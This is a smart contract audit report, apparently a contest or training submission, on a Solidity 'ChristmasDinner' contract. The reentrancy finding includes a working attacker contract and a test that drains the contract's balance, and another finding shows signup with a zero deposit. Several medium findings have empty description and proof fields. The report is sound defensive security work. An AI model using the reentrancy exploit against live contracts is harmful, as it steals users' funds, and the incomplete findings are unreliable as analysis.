### [H-1] Reentrancy attack in `ChristmasDinner::refund` allows malicious code to drain contract balance

**Description:**  The `ChristmasDinner::nonReentrant` modifier doesn't set `locked` to `true` before transfer money, so malicious code can bypass reentrant check and drain the contract balance.
```javascript
   modifier nonReentrant() {
        require(!locked, "No re-entrancy");
@>      _;
        locked = false;
    }
```
A malicious user who has entered the contract could have a `fallback`/`receive` function that calls the `ChristmasDinner::refund` function again and claim another refund. They could continue to cycle this until the contract balance is drained. 

**Impact:** All contract balance could be stolen by malicious user.

**Proof of Code:** 
<details>
<summary>Code</summary>

```javascript
contract ReentrancyAttacker {
    ChristmasDinner cd;
    ERC20Mock usdc;
    uint256 depositAmount = 1e18;

    constructor(ChristmasDinner _christmasDinner, ERC20Mock _usdc) {
        cd = ChristmasDinner(_christmasDinner);
        usdc = _usdc;
        usdc.approve(address(cd), depositAmount);
    }

    function attack() external payable {
        cd.deposit(address(usdc), depositAmount);
        cd.refund();
    }

    receive() external payable {
        console.log(ERC20Mock(usdc).balanceOf(address(cd)));
        if (ERC20Mock(usdc).balanceOf(address(cd)) > depositAmount) {
            cd.refund();
        }
    }
}

    function testReentrance() public {
        vm.prank(user1);
        cd.deposit(address(usdc), 2e18);
        uint256 depositAmount = 1e18;

        ReentrancyAttacker attacker = new ReentrancyAttacker(cd, usdc);
        usdc.mint(address(attacker), depositAmount);

        uint256 startingAttackerBalance = ERC20Mock(usdc).balanceOf(address(attacker));
        uint256 startingContractBalance = ERC20Mock(usdc).balanceOf(address(cd));

        attacker.attack();

        uint256 endingAttackerBalance = ERC20Mock(usdc).balanceOf(address(attacker));
        uint256 endingContractBalance = ERC20Mock(usdc).balanceOf(address(cd));

        assertEq(endingAttackerBalance, startingContractBalance + startingAttackerBalance);
        assertEq(endingContractBalance, 0);
    }
```
</details>

**Recommended Mitigation:** 
```diff
    modifier nonReentrant() {
        require(!locked, "No re-entrancy");
+       locked = true;    
        _;
        locked = false;
    }
```

### [M-1] User can sing up without paying, which violates the rule stated in the document: "we directly "force" the attendees to pay upon signup'

**Description:** 

**Impact:** 
User can sing up without paying

**Proof of Concept:**

```javascript
    function test_signUpWithoutPay() public{
        address newUser = makeAddr("new user");
        vm.startPrank(newUser);
        cd.deposit(address(wbtc), 0);
        vm.stopPrank();
    }
```

**Recommended Mitigation:** 
```diff
    function deposit(address _token, uint256 _amount) external beforeDeadline {
+       if(_amount == 0){
+           revert NeedPaying();
+       }
        if(!whitelisted[_token]) {
            revert NotSupportedToken();
        }
        if(participant[msg.sender]){
            balances[msg.sender][_token] += _amount;
            IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);
            emit GenerousAdditionalContribution(msg.sender, _amount);
        } else {
            participant[msg.sender] = true;
            balances[msg.sender][_token] += _amount;
            IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);
            emit NewSignup(msg.sender, _amount, getParticipationStatus(msg.sender));
        }

    }
```

### [M-2] Dangerous usage of block.timestamp comparison with `deadline`. block.timestamp can be manipulated by miners.

**Description:** 

**Impact:** 

**Proof of Concept:**

**Recommended Mitigation:** 
Avoid relying on block.timestamp


### [M-3] The host can reset the deadline multiple times

**Description:** 

**Impact:** 

participants can't refund 

**Proof of Concept:**

**Recommended Mitigation:** 
```diff
    function setDeadline(uint256 _days) external onlyHost {
        if(deadlineSet) {
            revert DeadlineAlreadySet();
        } else {
+           deadlineSet = true;
            deadline = block.timestamp + _days * 1 days;
            emit DeadlineSet(deadline);
        }
    }
```